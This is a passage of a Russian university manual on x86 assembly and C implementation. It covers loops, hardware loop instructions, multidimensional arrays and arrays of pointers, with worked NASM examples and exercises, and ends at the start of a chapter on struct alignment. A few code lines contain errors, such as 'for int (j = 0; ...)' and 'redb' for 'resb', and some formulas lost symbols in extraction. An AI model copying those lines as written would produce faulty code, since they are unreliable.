gramming course and at lecturers and postgraduate students.

Key words: computer architecture, assembly language, x86, nasm, C language implementa-
tion.


ISBN 978-5-89407-530-3            © Факультет вычислительной математики и кибернети-
                                  ки МГУ имени М.В. Ломоносова, 2014

ISBN 978-5-317-04886-0            © Кузьменкова Е.А., Падарян В.А., Соловьев М.А., 2014
Содержание
Введение ............................................................................................................................. 6
1.       Циклы и многомерные массивы .............................................................................. 7
     Пример 1-1 Циклический сдвиг в массиве .................................................................. 7
     Компактное кодирование циклов ................................................................................ 9
     Пример 1-2 Аппаратная поддержка цикла ................................................................ 10
     Многомерный массив .................................................................................................. 11
     Пример 1-3 Матрица целых чисел .............................................................................. 12
     Пример 1-4 Транспонирование матрицы .................................................................. 13
     Пример 1-5 Восстановление размеров массива ....................................................... 15
     Массив указателей ....................................................................................................... 16
     Пример 1-6 Массив указателей vs. Двумерный массив ........................................... 16
     Задачи ............................................................................................................................ 18
2.       Структуры и объединения ...................................................................................... 21
     Выравнивание данных в памяти ................................................................................. 21
     Пример 2-1 Размещение полей структуры в памяти ................................................ 22
     Пример 2-2 Структуры и объединения ...................................................................... 23
     Пример 2-3 Структуры и объединения в x86_64 ....................................................... 24
     Работа с полями............................................................................................................ 25
     Пример 2-4 Чтение и запись полей ............................................................................ 25
     Битовые поля ................................................................................................................ 27
     Пример 2-5 Взведение и сброс отдельных битов ..................................................... 27
     Задачи ............................................................................................................................ 28
3.       Организация вызова функций ................................................................................ 32
     Аппаратный стек ........................................................................................................... 32
     Пример 3-1 Пересылки без MOV ................................................................................ 32
     Соглашение вызова cdecl............................................................................................. 33
     Пример 3-2 Скалярное произведение ....................................................................... 34
     Пример 3-3 Рекурсивная функция .............................................................................. 36
     Пример 3-4 Восстановление прототипа функции ..................................................... 37
     Пример 3-5 Нарушение соглашения вызова ............................................................. 39

                                                                                                                                      3
         Вызов функций по указателю ...................................................................................... 39
         Пример 3-6 Просто указатель ..................................................................................... 39
         Пример 3-7 Массив в качестве возвращаемого значения ....................................... 40
         Пример 3-8 Функциональный тип у возвращаемого значения ............................... 41
         Использование библиотечных функций .................................................................... 42
         Пример 3-9 Динамическая память и переменное число параметров .................... 43
         Пример 3-10 Стандартный ввод/вывод своими силами .......................................... 45
         Пример 3-11 Дамп файла ............................................................................................ 47
         Устройство фрейма функции ....................................................................................... 49
         Пример 3-12 Карта фрейма ......................................................................................... 50
         Пример 3-13 Эксплойт ................................................................................................. 52
         Задачи ............................................................................................................................ 54
         Задача 3-3 Максимум двух чисел ............................................................................... 55
         Задача 3-4 Поменять местами .................................................................................... 55
         Задача 3-5 Восстановить объявление функции ......................................................... 55
         Задача 3-8 Факториал .................................................................................................. 56
         Задача 3-9 Только рекурсия ........................................................................................ 56
         Задача 3-10 Выравнивание стека ................................................................................ 56
         Задача 3-11 «Сколько время» ..................................................................................... 56
    4.       Различные соглашения вызова функций............................................................... 60
         Оптимизация вызова функций .................................................................................... 60
         Пример 4-1 “Omit frame pointer” ................................................................................ 60
         Пример 4-2 Соглашение fastcall .................................................................................. 61
         Очистка стека от аргументов вызова .......................................................................... 62
         Пример 4-3 Соглашение stdcall ................................................................................... 63
         Пример 4-4 Передача структуры в функцию в качестве параметра ....................... 63
         Пример 4-5 Возвращаемое значение – структура .................................................... 65
         Пример 4-6 Вызов функции с возвращаемой структурой ........................................ 67
         Задачи ............................................................................................................................ 69
    5.       Сопроцессор x87 и обработка чисел с плавающей точкой.................................. 72
         Представление вещественных чисел – числа с плавающей точкой........................ 72


4
   Пример 5-1 Перевод числа в модельную кодировку ............................................... 73
   Сопроцессор x87 ........................................................................................................... 74
   Пример 5-2 Взятие модуля числа ............................................................................... 75
   Пример 5-3 Разность чисел ......................................................................................... 76
   Пример 5-4 Ввод и вывод чисел с плавающей точкой ............................................. 77
   Пример 5-5 Сравнение чисел с плавающей точкой .................................................. 78
   Пример 5-6 Вычисление площади треугольника ...................................................... 79
   Задачи ............................................................................................................................ 80
   Задача 5-1 Перевод числа в модельную кодировку ................................................. 80
   Задача 5-2 Вычисление длины окружности............................................................... 80
   Задача 5-3 Приближение Чебышева .......................................................................... 81
   Задача 5-4 Теорема синусов ........................................................................................ 81
   Задача 5-5 Из полярных – в декартовы ...................................................................... 82
   Задача 5-6 Параллельное соединение ....................................................................... 83
Ответы и решения ............................................................................................................ 85
Литература ........................................................................................................................ 98




                                                                                                                                    5
    Введение
    Пособие содержит кратко изложенный материал семинарских занятий по курсу
    «Архитектура ЭВМ и язык ассемблера», читаемого для студентов 1 потока 1 курса
    факультета ВМК МГУ. Рассматриваются темы занятий второй половины семестра,
    такие как: организация циклов, работа с агрегатными типами данных, различные
    соглашения вызовов функций, работа с числами с плавающей точкой. Особое вни-
    мание уделено двоичному (бинарному) интерфейсу приложений платформы IA-32.
    На примере компилятора gcc показывается, как в Си-программах реализуется этот
    интерфейс, и каким образом он может повлиять на скорость работы программы и
    ее безопасность.

    Для разбора задач требуется свободное владение материалом первой части курса.
    Каждая рассматриваемая тема содержит краткий вводный материал, детально
    разобранные типовые задачи и задачи для самостоятельной работы, часть которых
    снабжена ответами.

    Методическое пособие предназначено для преподавателей, ведущих практиче-
    ские занятия в поддержку лекционного курса «Архитектура ЭВМ и язык ассембле-
    ра» для студентов 1 курса, а также рекомендуется студентам при подготовке к
    письменному экзамену.




6
1.      Циклы и многомерные массивы
Работа с массивами требует от профессионального разработчика эффективного
решения ряда задач: организации циклов, возможно многократно вложенных, ко-
дирования индексных выражений и четкого понимания, как именно данные раз-
мещены в памяти. От того, насколько успешно решаются эти задачи, зависит дли-
тельность отладки кода и достигаемая программой производительность.

Пример 1-1 Циклический сдвиг в массиве
Дан статический массив.

     enum { BUF_SIZE = 256 };
     static int buf[BUF_SIZE];



Требуется привести фрагменты программ на языке Си и на языке ассемблера, ко-
торые осуществляют следующее преобразование массива: выполняется цикличе-
ский сдвиг подмножества элементов массива, расположенных на расстоянии в 3
элемента друг от друга, начиная с элемента с индексом 1.




                                      Решение

В первую очередь приведем реализацию на языке Си.

                                                              Вариант «А»
     int previous = buf[1];
     for (int i = 4; i < 256; i += 3) {
        int tmp = buf[i];
        buf[i] = previous;
        previous = tmp;
     }
     buf[1] = previous;
                                                              Вариант «Б»
     int i = 253;
     while (i >= 4) {
        int tmp;
        tmp = buf[i];
        buf[i] = buf[i - 3];
        buf[i - 3] = tmp;
        i -= 3;
     }




                                                                            7
    Вариант «А» реализует обход элементов массива в прямом порядке – от младших
    индексов к старшим. Если в теле цикла сразу выполнить присваивание
    buf[i] = buf[i-3]; то текущее значение элемента buf[i] будет безвозвратно поте-
    ряно. На следующей итерации в присваивании будет участвовать значение не
    предыдущего элемента, а того, чье значение присваивалось на предыдущей ите-
    рации. В результате весь массив будет заполнен значением, взятым из элемента
    buf[1]. Чтобы избежать этого, введены вспомогательные переменные previous и
    tmp. Первая содержит в себе значение предыдущего элемента массива до присваи-
    вания. Вторая (tmp) используется для того, чтоб это значение не потерялось при
    присваивании. Относительной простой такой реализации является простота усло-
    вия окончания цикла – нельзя выходить за пределы массива.

    Вариант «Б» предполагает обход массива в обратном направлении, что позволяет
    получить более элегантное решение. Особенно заметны отличия вариантов на
    уровне ассемблерного кода. Идея заключается в том, что на каждой итерации эле-
    менты обмениваются своими значениями. Относительной сложностью становится
    определение наибольшего индекса, участвующего в обмене. Обмен начинается со
    второго элемента (с индексом 1). Индексы удовлетворяют условию 0  3  n  1  256
    , где n – целое число. Поскольку 255 делится на 3 нацело, наибольший индекс – 253.
    Два последних элемента массива в обмене не участвуют, а третий с конца – участ-
    вует.




    В результате обменов значение из buf[253] перемещается в buf[1], остальные зна-
    чения сдвигаются по массиву в конец, как и требовалось в условии задачи.

    Имея реализацию на языке Си, переведем код на язык ассемблера.




8
                                                                     Вариант «А»
   ; распределяем регистры
   ; ecx – int i
   ; eax – int tmp
   ; edx – int previous

      mov   edx, dword [buf + 4]         ; previous = buf[1];
      mov   ecx, 16                      ; i = 4; не забываем умножать на
                                         ;        sizeof(int) все то, что
                                         ;        относится к адресной
                                         ;        арифметике. В данном случае –
                                         ;        это регистр ecx
    .loop:
      cmp ecx, 1024                      ; i v 256
      jge .loop_end                      ; if (i >= 256) goto .loop_end;
      mov eax, dword [buf + 4 * ecx]     ; tmp = buf[i];
      mov dword [buf + 4 * ecx], edx     ; buf[i] = previous;
      mov edx, eax                       ; previous = tmp;
      add ecx, 12                        ; i += 3;
      jmp .loop                          ; переходим на следующую итерацию цикла
    .loop_end:
      mov dword [buf + 4], edx           ; buf[1] = previous;


                                                                      Вариант «Б»
   ; распределяем регистры
   ; ecx – int i
   ; eax – вспомогательный регистр при обмене значениями между элементами
   ;       массива buf[i] и buf[i - 3]

      mov ecx, 1012                        ; i = 253;
   .loop:
      mov eax, dword [buf + 4 * ecx]       ; инструкция xchg позволяет сократить
      xchg eax, dword [buf + 4 * ecx - 12] ; количество инструкций при обмене
      mov dword [buf + 4 * ecx], eax       ; значениями
      sub ecx, 12                          ; i -= 3;
      cmp ecx, 16                          ; i v 4
      jge .loop                            ; if (i >= 4) goto .loop;
   ; поскольку заранее известен размер массива, проверку можно перенести в
   ; конец тела цикла, избавившись от инструкции безусловной передачи управления



Компактное кодирование циклов
Исторически в наборе команд IA-32 присутствует поддержка цикла do-while в виде
команд LOOP, LOOPNE, LOOPE, JCXZ/JECXZ. Они выполняют условные переходы, исходя
из состояния регистра ECX (CX), который используется в качестве счетчика итераций.

Выполнение команды LOOP/LOOPcc уменьшает значение ECX на единицу, после чего
делается условный переход, если выполняется соответствующее условие. Если ECX
изначально быть равен 0, то после выполнения команды из семейства LOOP (и пе-
редачи управления на метку цикла), ECX станет 0xFFFFFFFF, что (скорее всего) приве-
дет к ошибочной работе программы.




                                                                                    9
     Для компактной записи проверки ECX на 0 следует воспользоваться командой JECXZ,
     позволяющей «перепрыгнуть» цикл, когда ECX равен 0. Команда JCXZ работает ана-
     логично, но с регистром CX.

     Еще одной особенностью является то, что условный переход в командах
     LOOP/LOOPcc может быть только в пределах [–128, 127] байтов от текущей позиции в
     коде. Закодировать цикл с достаточно объемным телом не получится, т. к. ассем-
     блер не сможет построить код для инструкции, выполняющей переход на слишком
     удаленную метку.

     Таблица 1. Описание команд аппаратной поддержки цикла.

     Команда         Описание
     JCXZ/JECXZ      Переход выполняется, если значение регистра CX/ECX равно нулю.
     LOOP            Переход выполняется, если значение регистра ECX не равно нулю.
     LOOPZ/LOOPE     Переход выполняется, если значение регистра ECX не равно нулю и
                     флаг ZF установлен.
     LOOPNZ/LOOPNE Переход выполняется, если значение регистра ECX не равно нулю и
                     флаг ZF сброшен.


     Пример 1-2 Аппаратная поддержка цикла
     В статическом буфере памяти B хранятся 32-х разрядные числа. Длина буфера (в
     элементах) задана в регистре ECX, требуется найти в буфере B все нечетные числа.

                                             Решение

     Важной особенностью применения команды LOOP является то, что счетчиком цикла
     обязательно становится регистр ECX, его нельзя использовать для хранения каких-
     либо иных данных. Помимо того, при использовании команды LOOP счетчик цикла
     не увеличивается от нуля до некоторого порогового значения, а наоборот, начиная
     с порогового значения, уменьшается до единицы, что требует аккуратности при ис-
     пользовании ECX в вычислении индексных выражений. Ниже приведено решение,
     учитывающее эти особенности.

              mov   eax, 0                   ; (1)
              jecxz .le                      ; (2)
        .l:
           bt      dword [B + 4*ecx -4], 0   ; (3)
           adc     eax, 0                    ; (4)
           loop    .l                        ; (5)
        .le:




10
Регистр EAX используем для накопления числа нечетных элементов. Во второй ко-
манде происходит проверка длины массива, если длина нулевая – сразу перехо-
дим на выход из цикла. В третьей команде проверятся нулевой бит элемента мас-
сива.

Поскольку порядок обхода элементов массива не важен, непосредственно исполь-
зуем ECX в вычислении индексного выражения. Умножаем счетчик на размер типа
и дополнительно вычитаем из адреса 4, т. к. значения счетчика сдвинуты на еди-
ницу относительно индексов массива. Первая итерация цикла будет выполняться с
ECX = N, где N – длина массива, а обращение к массиву должно быть B[N-1]. По-
следняя итерация происходит с ECX = 1, но обращаться необходимо по адресу B +
0.

Выполнившаяся команда BT поместит последний бит числа во флаг CF, который в
следующей, четвертой команде будет добавлен к регистру EAX.

Последняя, пятая, команда будет возвращать управление на метку .l до тех пор,
тело цикла не выполнится с ECX = 1.

Многомерный массив
При интерпретации объявления двумерного массива следует помнить о приорите-
те операций: с именем переменной ассоциируются ближайшие справа квадратные
скобки, остальные размерности следует связывать типом элемента многомерного
массива.




При объявлении переменной int m[20][14] в памяти необходимо последовательно
и без промежутков разместить 20 переменных, имеющих тип int[14]. Если пере-
менная статическая, в ассемблерной программе метка m будет использоваться для
обращения к началу этой памяти (в точности, как и в случае с одномерными масси-
вами). Таким образом, в языке Си размещение двумерного массива в памяти про-
исходит по строкам, поскольку первый индекс принято считать номером строки, а
второй – номером столбца.

Такая интерпретация позволяет использовать правила умолчания, когда размер
массива неизвестен: например, допустимо объявление int q[][14], но недопусти-
мо int qq[14][]. Правила умолчания предписывают в отсутствии размера создать
массив из одного элемента. В первом случае массив q состоит из одного элемента
полного типа int[14], а во втором тип неполон. Создать массив qq из 14 элементов
неполного типа (его размер неизвестен) не получится.



                                                                            11
     При обращении к элементу матрицы адрес элемента определяется как сумма
     начального адреса массива и смещений по первому и второму индексам. Как и в
     случае с одномерным массивом смещение получается умножением значения ин-
     дексного выражения на размер соответствующего типа. Следовательно, при под-
     счете смещения, порождаемого первым индексом размер необходимо определять
     для типа T[M].

     Итого, для обращения к элементу matrix[i][j] матрицы T matrix[N][M]необходимо
     вычислить адрес 𝜒𝑚𝑎𝑡𝑟𝑖𝑥 + 𝑖 × 𝑠𝑖𝑧𝑒𝑜𝑓 (𝑇[𝑀]) + 𝑗 × 𝑠𝑖𝑧𝑒𝑜𝑓(𝑇), где 𝜒𝑚𝑎𝑡𝑟𝑖𝑥 – началь-
     ный (базовый) адрес переменной matrix.

     Пример 1-3 Матрица целых чисел
     Напишите фрагмент ассемблерной программы, в которой:

     1)     в статической памяти выделено пространство для матрицы 32-х разрядных
            целых чисел размером N*N,

     2)     выполняется поиск максимального по модулю элемента главной диагонали,

     3)     найденное число печатается на стандартный вывод.

                                        Решение

     Для размещения двумерного массива T array[N][N] необходимо выделить непре-
     рывный блок памяти длиной в sizeof(T)*N*N байтов. Поскольку в условии ничего не
     говорится о начальных значениях элементов массива, матрица будет размещена в
     сегменте .bss.

     Ввод данных во фрагменте пропущен. Для вычислений используются три регистра:
     EAX – для хранения максимального модуля, ECX – для извлечения элементов масси-
     ва, EDX – для работы с текущим элементом.

     Загрузка очередного элемента соответствует обращению к элементу Си-массива с
     двойным индексным выражением.

          int a[N][N];
          a[i][i];



     Двумерный массив размещен в памяти построчно: начиная с базового адреса идет
     первая строка (с индексом 0), затем вторая и т. д. Между строками нет промежут-
     ков, внутри строки элементы также идут без промежутков, поскольку строка – од-
     номерный массив целых чисел. Обращение к каждой последующей строке требует
     добавления к базовому адресу массива смещения величиной в размер строки.


12
Строка – массив из N элементов типа int, его размер – 4*N байтов. Обращение к по-
следующему элементу в столбце – требует добавления 4 байтов. На каждой итера-
ции происходит сдвиг на одну строку и один столбец, что означает дополнитель-
ное смещение от базового адреса на 4*(N+1) байтов. Это приращение происходит в
конце цикла, после чего проверяется, не вышло ли суммарное смещение от начала
массива на его пределы.

  extern io_print_dec, io_newline

  section .bss
  N equ …           ; определяем константу N с некоторым значением
     a resd (N * N) ; выделяем N*N элементов по 4 байта

  section .text
  global main
  main:
     ; ввод матрицы

     mov    eax, 0              ; В регистре eax – максимальное по модулю
                                ; значение диагональных элементов
     mov    ecx, 0              ; ecx – счетчик итераций и заодно смещение от
                                ; начала блока памяти

   .l:                          ; метка – начало тела цикла
     mov   edx, dword [a + ecx] ; Загружаем очередной диагональный элемент
     cmp   edx, 0               ; Сравниваем его с 0
     jge   .pos                 ; и если он меньше -
     neg   edx                  ; меняем его знак
   .pos:
     cmp   edx, eax             ; Сравниваем текущий модуль с максимальным и
     cmovg eax, edx             ; если он больше – пересылаем его в eax
     add   ecx, 4 * (N + 1)     ; Увеличиваем смещение на одну строку и один
     cmp   ecx, 4 * (N * N)     ; столбец. Сравниваем текущее смещение с
     jl    .l                   ; границей выделенной памяти.

     call   io_print_dec
     call   io_newline
     xor    eax, eax
     ret


Пример 1-4 Транспонирование матрицы
Дана матрица целых чисел: static int A[M][N]. Требуется написать фрагмент про-
граммы, транспонирующий эту матрицу с запоминанием результата в другой мат-
рице: static int B[N][M].

                                    Решение

На языке Си запись требуемого алгоритма имеет следующий вид.




                                                                                13
       static int A[M][N];
       static int B[N][M];

       for (int i = 0; i < M; i++) {
          for (int j = 0; j < N; j++) {
             B[j][i] = A[i][j];
          }
       }




     Переводим построенный код на язык ассемблера. Используем регистры ESI и EDI
     для хранения переменных цикла, регистр ECX – для вычисления смещения от нача-
     ла массива в двойных словах.

                                                                           Вариант «А»
       section .bss
          A resd M*N
          B resd N*M

       section .text

          mov   esi, 0 ; индекс i

        .l1:                          ; Начинается тело внешнего цикла
          mov   edi, 0 ; индекс j

        .l2:                         ; Начинается тело внутреннего цикла
          imul ecx, esi, N           ; Смещаемся на esi строк по N элементов каждая
          add ecx, edi               ; … и еще на edi элементов (массив A)
          mov eax, dword [A + 4*ecx] ; Считываем элемент по вычисленному смещению
          imul ecx, edi, M           ; Аналогично считаем смещение в массиве B
          add ecx, esi
          mov dword [B + 4*ecx], eax ; и записываем значение элемента

          inc   edi                   ; Проверка счетчика внутреннего цикла
          cmp   edi, N
          jl    .l2

          inc   esi                   ; Проверка счетчика внешнего цикла
          cmp   esi, M
          jl    .l1



     Как можно заметить, обращение к элементам массива A приводит к последова-
     тельному считыванию содержимого памяти, что позволяет избавиться от одного
     умножения во вложенном цикле. Идея заключается в том, что смещение для мас-
     сива A хранится в дополнительно выделенном регистре EDX, на каждой итерации
     внутреннего цикла EDX будет увеличиваться на единицу. Новые команды в вариан-
     те «Б» показаны серым цветом. Замена двойного цикла на одинарный не пред-
     ставляется целесообразной, т. к. преобразование линейного смещения в индексы
     матрицы B дополнительно потребует вычисления частного и остатка, что является
     достаточно дорогой операцией.


14
                                                              Вариант «Б»
  section .bss
     A resd M*N
     B resd N*M

  section .text

     mov   esi, 0 ; индекс i
     mov   edx, 0

   .l1:
     mov   edi, 0 ; индекс j

   .l2:
     mov eax, dword [A + 4*edx]
     imul ecx, edi, M
     add ecx, esi
     mov dword [B + 4*ecx], eax

     inc   edx
     inc   edi
     cmp   edi, N
     jl    .l2

     inc   esi
     cmp   esi, M
     jl    .l1



Пример 1-5 Восстановление размеров массива
В следующем фрагменте Си-программы используются константы R и S.

  int A[R][S];

  int extract(int i, int j, int *dest) {
     *dest = A[i][j];
     return sizeof(A);
  }



Для тела данной функции был получен следующий ассемблерный код. Формаль-
ные параметры функции расположены в памяти по следующим адресам: i – EBP+8,
j – EBP+12, dest – EBP+16.


     imul eax, dword [ebp + 8], 90 ; (1)
     add eax, dword [ebp + 12]     ; (2)
     mov edx, dword [A + eax * 4] ; (3)
     mov eax, dword [ebp + 16]     ; (4)
     mov dword [eax], edx          ; (5)
     mov eax, 3960                 ; (6)



Определите значения констант R и S.



                                                                            15
                                        Решение


          imul eax, dword [ebp + 8], 90 ; (1) В регистр eax помещается значение
                                        ;     выражения i * 90
          add eax, dword [ebp + 12]     ; (2) Добавляем j. итого, в eax находится
                                        ;     значение выражения i * 90 + j
          mov edx, dword [A + eax * 4] ; (3) В регистр помещается 32-разрядное
                                        ;     значение из памяти по адресу
                                        ;     a + 4 * (i * 90 + j)
          mov eax, dword [ebp + 16]     ; (4) Теперь в eax помещается значение
                                        ;     параметра dest, являющегося указателем
          mov dword [eax], edx          ; (5) По этому адресу (*dest) кладется
                                        ;     содержимое edx
          mov eax, 3960                 ; (6) Возвращаемое значение – 3960



     Для произвольного типа T размер двумерного массива T arrary[N1][N2] определятся
     по формуле sizeof(T)*N1*N2. Размер всего массива можно определить из инструк-
     ции №6, в регистр EAX помещается константа, являющаяся значением sizeof(A). Та-
     ким образом,

                   sizeof(A) = 3960  sizeof(int)*R*S = 3960  R*S = 990

     Ключевым моментом является определение порядка вычисления адреса памяти,
     используемого в инструкции №3. В адресе A+4*(i*90+j) реализовано обращение к
     элементу массива A[i][j]. Первый индекс означает, что необходимо i раз переме-
     стится на расстояние из S элементов. Таким образом, константа S = 90. Из приве-
     денного выше уравнения можно определить, что R = 11.

     Массив указателей
     Массивы указателей позволяют применять два индексных выражения, как и в слу-
     чае с матрицей. Но массив указателей имеет два существенных отличия. Во-
     первых, при объявлении такой переменной элементом одномерного массива яв-
     ляется указатель, всегда требующий для своего размещения 4 байта. Во-вторых,
     элемент скалярного типа получается уже после вычисления первого индекса, после
     чего необходимо обратиться в память и извлечь оттуда элемент-адрес. Далее к
     этому извлеченному адресу прибавляется смещение, полученное при вычислении
     второго индексного выражения. Таким образом, для объявления T* pA[N] вычисле-
     ние       адреса    элемента     p[i][j]     будет   соответствовать   формуле
     𝑀[𝜒𝑝𝐴 + 𝑖 × 4] + 𝑗 × 𝑠𝑖𝑧𝑒𝑜𝑓(𝑇), где 𝜒𝑝𝐴 – начальный (базовый) адрес переменной
     pA , а M[A] – содержимое памяти по адресу A.

     Пример 1-6 Массив указателей vs. Двумерный массив
     Дан массив некоторой ненулевой длины, содержащий ненулевые указатели на
     ограниченные нулем строки символов. Строки преобразуются с помощью массива
     подстановок. Переведите Си-код на язык ассемблера.

16
  static char *strings[N];
  static char tr[8][256];

  for (int i = 0; i < N; i++) {
     for int (j = 0; '\0' != strings[i][j]; j++) {
        strings[i][j] = tr[i % 8][(unsigned char)strings[i][j]];
     }
  }



                                   Решение

На языке Си код, обращающийся к массиву указателей, ничем не отличается от об-
ращения к двумерному массиву: дважды используется операция индексирования.
Но типы данных массивов требуют реализовывать эти обращения различными
способами. Вычисление strings[i][j] потребует сначала извлечь из памяти указа-
тель strings[i], а затем использовать его в качестве адреса при обращении к оче-
редному символу в преобразуемой строке. Обращение к двумерному массиву tr
требует вычислить смещение в непрерывном блоке памяти, выделенном для его
размещения. Помимо того, различие между переменными strings и tr проявляется
в выделении памяти: для первой был выделен одномерный массив из N двойных
слов (хранятся указатели), для второй – 8*256 байтов, в которых последовательно
размещены строки двумерного массива.

  section .bss          ; выделяем память под переменные
     strings resd N
     tr      redb 8*256

  section .text
     mov   ecx, 0                       ; В ecx размещаем i. Т.к. массив строк
                                        ; не пустой – предварительно проверять
   .l1:                                 ; i не требуется
     mov   ebx, dword [strings + 4*ecx] ; Помещаем в ebx strings[i] – адрес
                                        ; начала в памяти очередной строки
     cmp   byte [ebx], 0                ; Перед первым выполнением тела for
     jz    .l2e                         ; проверяем условие выхода из цикла,
   .l2:                                 ; поскольку строка может быть пустой
     movzx edx, byte [ebx]              ; Беззнаковое расширение char
     mov   eax, ecx                     ; Вычисляем смещение для массива tr
     and   eax, 7                       ; еах – смещение на (i%8) строк,
     sal   eax, 8                       ; умноженное на 256
     mov   dl, byte [tr + eax + edx]    ; edx – смещение внутри строки
     mov   byte [ebx], dl               ; Сохраняем новое значение
     inc   ebx                          ; Переходим на адрес очередного символа
     cmp   byte [ebx], 0
     jnz   .l2                          ; Продолжаем, если strings[i][j] != 0

   .l2e:
     inc   ecx
     cmp   ecx, N
     jl    .l1                          ; Продолжаем внешний цикл, пока i < N




                                                                                  17
     Следует отметить, что условие указывает на то, что в массиве strings находятся
     ненулевые указатели. В противном случае потребуется дополнительная проверка,
     и корректный Си-код будет выглядеть следующим образом.

       static char *strings[N];
       static char tr[8][256];

       for (int i = 0; i < N; i++) {
          if (NULL != strings[i]) {
             for int (j = 0; '\0' != strings[i][j]; j++) {
                strings[i][j] = tr[i % 8][(unsigned char)strings[i][j]];
             }
          }
       }



     Задачи
     Задачи, название которых подчеркнуто, снабжены ответом, приведенным в конце
     пособия.

     Задача 1-1
     Заданы два массива целых чисел: массив short A[100] и массив int B[100]. Требует-
     ся выполнить копирование всех элементов массива A в массив B со знаковым рас-
     ширением.

     Задача 1-2
     В переменной A хранится указатель на область памяти, содержащую слова, количе-
     ство которых указано в переменной N. Требуется расширить каждое из этих слов до
     двойного слова «на месте», то есть после работы программы A указывает на массив
     из N двойных слов, значения которых получены знаковым расширением исходных
     значений. Считать, что выделенной памяти достаточно для хранения N двойных
     слов.

     Замечание: следует расширять элементы «справа налево», так как иначе произой-
     дет перезапись части оригинального массива.

     Задача 1-3
     Напишите ассемблерную программу, проверяющую симметричность статического
     массива (N элементов типа int, N – константа, 2 <= N < 220): одинаковые значения
     имеют первый и последний, второй и предпоследний, и т. д. Выполнять ввод зна-
     чений элементов массива и выравнивать стек не требуется. Если массив симмет-
     ричный, на выходе из функции main регистр EAX должен иметь значение 0, в про-
     тивном случае – 1. Запрещается использовать строковые инструкции и использо-
     вать стек. Программа должна содержать не более 16 инструкций. Учитываются все
     инструкции, включая ret.


18
Задача 1-4
В заданном массиве short a[50] поменять местами максимальный и минимальный
элементы.

Задача 1-5
Дан массив из 100 элементов типа int. Найти сумму элементов массива, превосхо-
дящих значение последнего элемента.

Задача 1-6
Даны два массива из 100 элементов типа short. Проверить массивы на равенство и
напечатать 1 в случае положительного ответа и 0 в противном случае.

Задача 1-7
Дан массив char x[200], содержащий символы некоторого текста. Сформировать
массив char y[200], в начале которого расположены все цифры из массива x (в по-
рядке их следования в исходном массиве), затем все оставшиеся символы из мас-
сива y (в произвольном порядке).

Задача 1-8
Написать программу, которая вводит число типа unsigned long long и печатает в по-
рядке убывания все десятичные цифры, входящие в это число.

Задача 1-9
Дан текст, состоящий из строчных латинских букв, оканчивающийся точкой (точка в
текст не входит). Напечатать:

   а) в алфавитном порядке все строчные латинские буквы, встречающиеся в тек-
      сте ровно 1 раз;
   б) букву, наиболее часто встречающуюся в тексте. В случае если таких букв не-
      сколько, напечатать первую по алфавиту.

Задача 1-10
Дана матрица int A[N][M]. Выписать код, загружающий элемент A[i][j] на регистр
EDX.

Задача 1-11
Дана матрица int A[N][N]. Требуется напечатать сумму всех нечетных элементов ее
главной диагонали.

Задача 1-12
Транспонируйте квадратную матрицу «на месте», не используя дополнительной
памяти.




                                                                             19
     Более сложный вариант задачи: Транспонируйте «на месте», не используя до-
     полнительной памяти, матрицу произвольного размера M×N. До и после транспони-
     рования матрица хранится в памяти с разверткой по строкам.

     Задача 1-13
     Дана матрица размера N×N (N = 50) из элементов типа int.

        а) Найти сумму элементов матрицы, лежащих ниже главной диагонали.
        б) Поменять местами элементы главной и побочной диагоналей матрицы.
        в) Подсчитать количество строк матрицы, элементы которых упорядочены по
           возрастанию.
        г) Напечатать номер строки, содержащей наибольшее количество нулевых
           элементов.

     Задача 1-14
     Дан массив из 30 ненулевых указателей на ограниченные нулем строки символов.

        а) Подсчитать количество строк, начинающихся с ненулевой цифры.
        б) Напечатать строку максимальной длины. Если таких строк несколько, напе-
           чатать первую из них по порядку следования в массиве.
        в) Подсчитать количество строк, являющихся палиндромами.

     Задача 1-15
     Дана матрица int A[N][M]. Требуется удалить из нее все строки, сумма элементов в
     которых меньше нуля.

     Задача 1-16
     Дана матрица, заданная в виде массива указателей int *A[N], где для каждой стро-
     ки уже выделена и заполнена память под M элементов. Требуется удалить из нее
     все столбцы, сумма элементов в которых меньше нуля.

     Задача 1-17
     Дана последовательность слов, состоящих из строчных латинских букв. Слова от-
     делены друг от друга одним или несколькими пробелами, после последнего слова
     записана точка, не входящая в текст. Удалите из текста лишние пробелы.

        а) Текст вводится и выводится посимвольно.
        б) Текст содержится в массиве char S[] и выводится на печать посимвольно.
        в) Текст содержится в массиве char S[], а обработанный текст размещается в
           массиве char R[].
        г) Тест содержится в массиве char S[] и обрабатывается «на месте».




20
2.    Структуры и объединения
Выравнивание данных в памяти
При размещении в памяти массивов все элементы расположены друг за другом,
без промежутков. Структуры объединяют в себе поля произвольных типов, разме-
щаемых в памяти в том же порядке, в каком они были объявлены в исходном Си-
коде. Размещение неоднородных (различной длины) полей структуры возможно
аналогичным образом, без промежутков, но особенности работы аппаратуры бу-
дут проявляться в задержках чтения и записи невыровненных в памяти данных.
Современные компиляторы используют байты-заполнители, чтобы поля структур
всегда размещались в памяти на адресах, кратных некоторым числам, в зависимо-
сти от типов полей.

Правила выравнивания полей зависят от платформы: архитектуры аппаратуры и
работающей на ней операционной системы (Таблица 1). Число N в ячейке таблицы
означает, что поле данного типа расположено на расстоянии кратном N от началь-
ного (базового) адреса структуры. Для 32-разрядного кода правила выравнивания
в типовых компиляторов ОС Windows и Linux различаются только для типа double. В
случае 64-разрядного кода часть изменений в правилах обусловлена увеличением
машинного слова с 4 байтов до 8, вследствие чего меняются размеры указателей и
типа long.

Таблица 2. Правила выравнивания для полей различных типов .

                                                                              long
                 char    short    int    long   указатель   float   double
                                                                             double

IA-32/Linux        –       2       4      4        4         4        4        4
IA-32/Windows      –       2       4      4        4         4        8        4
x86_64/Linux       –       2       4      8        8         4        8        8
x86_64/Windows     –       2       4      4        8         4        8        8


Правила выравнивания полей являются частью ABI – двоичного (бинарного) ин-
терфейса приложений. В ABI входят соглашения между программами, библиоте-
ками и операционной системой, обеспечивающих взаимодействие этих компонен-
тов на низком уровне на данной платформе. В частности, это дает возможность
объединять в единую работающую программу модули, независимо друг от друга
скомпилированные, в том числе различными компиляторами, и даже изначально
написанные на различных языках программирования. В разделах 3 и 4 будет рас-
смотрена другая важная часть ABI – соглашения вызова функций.


                                                                                21
     Пример 2-1 Размещение полей структуры в памяти
     Дан тип данных P, описывающий структуру. Компиляция кода выполняется в ОС
     Linux.

       typedef struct {
          int i;
          char c;
          int j;
          char d;
       } P;



     Определите размер типа данных P. Для каждого поля укажите его смещение отно-
     сительно начала структуры.

                                       Решение

     Приведем рисунок, демонстрирующий размещение полей структуры в памяти.




